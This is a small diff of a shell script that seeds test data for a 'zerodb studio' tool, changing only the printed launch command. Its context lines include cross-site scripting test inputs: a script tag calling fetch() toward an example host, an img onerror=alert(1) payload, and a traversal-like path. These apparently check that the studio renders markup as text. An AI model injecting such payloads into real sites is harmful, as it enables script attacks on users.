@@ -71,5 +71,5 @@ note copilot '../x#y?z%' 'Pasted from a web page: <script>fetch("https://example
 fact copilot 'repo/zerodb/<img src=x onerror=alert(1)>' 'A key with markup in it. It must show as text.'
 
 echo "seeded $dir"
-echo "open it with: HOME=$dir XDG_DATA_HOME= zerodb studio"
+echo "open it with: HOME=$dir XDG_DATA_HOME= ZERODB_HOME= zerodb studio"
 echo "its server runs as pid $(pid). Stop it with: kill $(pid)"
